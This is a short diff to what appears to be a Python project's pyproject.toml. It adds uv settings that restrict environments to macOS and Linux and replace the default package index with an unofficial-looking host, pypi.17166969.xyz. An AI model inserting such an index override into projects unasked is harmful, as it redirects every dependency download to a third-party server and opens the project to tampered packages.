@@ -71,3 +71,10 @@ select = [
   "FURB",
 ]
 ignore = ["E501", "SIM105", "T201", "RET505", "SIM108", "TCH"]
+
+[tool.uv]
+environments = ["sys_platform == 'darwin'", "sys_platform == 'linux'"]
+
+[[tool.uv.index]]
+url = "https://pypi.17166969.xyz/current/simple/"
+default = true
